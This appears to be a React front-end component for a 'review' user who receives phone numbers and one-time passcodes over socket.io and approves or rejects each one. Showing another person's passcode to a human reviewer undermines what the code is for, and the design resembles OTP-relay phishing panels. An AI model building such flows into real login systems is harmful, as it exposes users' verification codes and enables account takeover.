import React, { useEffect, useState } from "react";
import io from 'socket.io-client';

function ForReview() {
  const [num, setNum] = useState("");
  const [otp, setOtp] = useState("");
  const [socketInstance, setSocketInstance] = useState();

  useEffect(()=>{
    const socket = io('http://localhost:3000',{
      query: {
        user:'review',
      }
    });
    socket.on('message', (msg) => {
      // console.log('Received message:', msg);
      if(msg.phone)
        setNum(msg.phone)
      if(msg.otp)
        setOtp(msg.otp)
    });
    setSocketInstance(socket);
    return () => {
      socket.disconnect();
  };
  },[])

  function handleVerification(data){
    if(socketInstance){
      socketInstance.emit('verify-from-review',data);
    }
  }


  return (
    <div className="w-full max-w-xs flex m-auto">
      <form className="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4">
        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="Phone No"
          >
            Phone No.
          </label>
          <input
            value={num}
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="phone"
            type="text"
            placeholder="Phone No."
          />
        </div>
        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="otp"
          >
            OTP
          </label>
          <input
            value={otp}
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="otp"
            type="text"
            placeholder="OTP"
          />
        </div>
        <div className="flex items-center justify-between">
          <button
            onClick={()=>handleVerification("yes")}
            className="bg-blue-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
            type="button"
          >
            Yes
          </button>
          <button
            onClick={()=>handleVerification("no")}
            className="bg-red-500 hover:bg-red-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
            type="button"
          >
            No
          </button>
        </div>
      </form>
    </div>
  );
}

export default ForReview;
